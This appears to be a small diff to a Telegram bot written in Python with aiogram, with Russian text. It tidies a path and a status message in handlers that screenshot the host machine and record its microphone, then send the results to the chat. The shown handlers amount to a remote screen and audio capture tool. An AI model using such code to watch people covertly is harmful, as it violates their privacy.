@@ -7,7 +7,6 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import FSInputFile
 from environs import Env
 
-# Импорты логики
 from Funcs import fun_commands, funcs
 from Funcs.state import return_message
 from Keyboardz.keyboard_fun import keyBoard_funs, keyboard_wybor
@@ -44,7 +43,7 @@ async def process_fun_action(message: types.Message, state: FSMContext):
         await message.answer("Делаю скриншот...")
         fun_commands.FunFuncs.screenshot()
 
-        path = f'{funcs.PATH}ss.png'
+        path = os.path.join(funcs.PATH, 'ss.png')
         try:
             photo_file = FSInputFile(path)
             await message.answer_photo(photo_file)
@@ -200,7 +199,7 @@ async def process_fun_input(message: types.Message, state: FSMContext):
                 # Не сбрасываем состояние, ждем ввода снова
                 return
 
-            status_msg = await message.answer(f"🎤 Записываю {duration} сек...")
+            status_msg = await message.answer(f"Записываю {duration} сек...")
 
             # Вызываем функцию из fun_commands.FunFuncs (она там должна быть добавлена)
             file_path = await fun_commands.FunFuncs.record_audio(duration)
